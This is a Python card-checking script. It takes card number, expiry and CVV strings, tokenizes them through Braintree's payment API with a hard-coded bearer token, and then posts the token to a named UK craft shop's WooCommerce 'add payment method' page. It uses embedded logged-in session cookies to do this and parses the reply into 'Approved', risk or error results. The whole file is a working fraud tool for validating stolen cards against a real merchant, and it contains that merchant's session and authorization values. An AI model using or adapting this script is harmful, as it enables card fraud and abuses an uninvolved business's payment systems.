import requests, re, base64, random, string, user_agent, time
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	

	














	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTk3OTYzMjEsImp0aSI6IjQ2YmVkZTdjLWUxMzQtNGI5Yy1hNWMwLTA2NWEwNGE2NjJlYSIsInN1YiI6Inc5bnI1cHM2anluZGZ3Z24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Inc5bnI1cHM2anluZGZ3Z24iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.I7qFNkGiwjow0wbRMrufaoAlIKnGSoOKJjDxSGIR1Fh1JOH5ArETjHvJ-HlAWWkhsHt-aXCkVQkJF__I8yDWkw',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '8055d7a5-3acc-434a-8505-29ba21d7e27e',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"8055d7a5-3acc-434a-8505-29ba21d7e27e"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581818109910","expirationMonth":"06","expirationYear":"2025","cvv":"291"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)




	tok = response.json()['data']['tokenizeCreditCard']['token']











	cookies = {
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-06-30%2001%3A10%3A23%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fproduct%2Fa-step-forward-for-tilly%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-06-30%2001%3A10%3A23%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fproduct%2Fa-step-forward-for-tilly%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '_ga': 'GA1.1.762981802.1719709825',
    'eucookielaw': '1735261845807',
    'wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29': 'bbxbcbb.hhxbfbb-4904%7C1720919476%7CyuJStI6sJGriMnQrtQqCUr5Ujn2p7oFn0KEXm2vKEnc%7Cf6a1ec4af6444ef0d08a450e7deec5f268a32fd7f4bb30bf27be71479828e6b8',
    'wp_woocommerce_session_8f9b66474434421691b2f5f503bb4c29': '198%7C%7C1719882641%7C%7C1719879041%7C%7Cdb754cba60c557289d8c5dfc0cdbc09e',
    'tk_ai': 'jetpack%3ANJ0PFN3V52Y2vAngqRe2vAxe',
    'wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197': '198%7Cother%7Cread%7Cdb44a237b72729db9ddd7a64e742207a805ed7ecf82269cc4d19eae1dcab29f6',
    '_ga_EX1GV7CW1V': 'GS1.1.1719709824.1.1.1719709880.0.0.0',
    '_ga_347410393': 'GS1.1.1719709824.1.1.1719709880.0.0.0',
    'sbjs_session': 'pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
}

	headers = {
    'authority': 'www.carolyngibbsquilts.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-06-30%2001%3A10%3A23%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fproduct%2Fa-step-forward-for-tilly%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-06-30%2001%3A10%3A23%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fproduct%2Fa-step-forward-for-tilly%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _ga=GA1.1.762981802.1719709825; eucookielaw=1735261845807; wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29=bbxbcbb.hhxbfbb-4904%7C1720919476%7CyuJStI6sJGriMnQrtQqCUr5Ujn2p7oFn0KEXm2vKEnc%7Cf6a1ec4af6444ef0d08a450e7deec5f268a32fd7f4bb30bf27be71479828e6b8; wp_woocommerce_session_8f9b66474434421691b2f5f503bb4c29=198%7C%7C1719882641%7C%7C1719879041%7C%7Cdb754cba60c557289d8c5dfc0cdbc09e; tk_ai=jetpack%3ANJ0PFN3V52Y2vAngqRe2vAxe; wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197=198%7Cother%7Cread%7Cdb44a237b72729db9ddd7a64e742207a805ed7ecf82269cc4d19eae1dcab29f6; _ga_EX1GV7CW1V=GS1.1.1719709824.1.1.1719709880.0.0.0; _ga_347410393=GS1.1.1719709824.1.1.1719709880.0.0.0; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    'origin': 'https://www.carolyngibbsquilts.co.uk',
    'pragma': 'no-cache',
    'referer': 'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = [
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"430fe0f7bb54bfaeafe9b79d85dea034"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'GBP'),
    ('wc_braintree_paypal_locale', 'en_gb'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'master-card'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', tok,),
    ('wc_braintree_device_data', '{"correlation_id":"430fe0f7bb54bfaeafe9b79d85dea034"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', '0ecbc0ff86'),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]

	response = requests.post(
    'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
	
	text = response.text
	
	pattern = r'Status code (.*?)\s*</li>'
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
